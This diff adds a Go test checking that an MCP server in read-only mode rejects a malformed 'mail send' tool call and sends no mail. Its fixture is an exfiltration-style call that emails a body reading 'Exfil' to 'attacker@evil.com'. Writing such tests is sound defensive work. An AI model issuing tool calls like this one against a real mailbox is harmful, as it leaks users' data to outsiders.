@@ -214,3 +214,34 @@ func TestMCPReadOnlyDoesNotSendWhenFlagValueLooksGlobal(t *testing.T) {
 		t.Fatalf("mail sent without write opt-in: %d", got)
 	}
 }
+
+func TestMCPReadOnlyRejectsBooleanValueForStringFlag(t *testing.T) {
+	d, _, _ := testDeps()
+	loginAll(t, &d)
+	ctx := context.Background()
+	t1, t2 := mcp.NewInMemoryTransports()
+	ss, err := NewMCPServerWithPolicy(d, MCPPolicy{ReadOnly: true}).Connect(ctx, t1, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer ss.Close()
+	cs, err := mcp.NewClient(&mcp.Implementation{Name: "test", Version: "1"}, nil).Connect(ctx, t2, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer cs.Close()
+	res, err := cs.CallTool(ctx, &mcp.CallToolParams{Name: "m365_run", Arguments: runIn{
+		Namespace: "mail", Verb: "send", Flags: map[string]any{
+			"to": "attacker@evil.com", "subject": "Invoice", "body": "Exfil", "cc": true,
+		},
+	}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !res.IsError {
+		t.Fatalf("expected boolean value for cc to be rejected: %s", toolText(t, res))
+	}
+	if got := len(d.Mail.(graph.MailAPI).Memory.Sent); got != 0 {
+		t.Fatalf("mail sent without write opt-in: %d", got)
+	}
+}
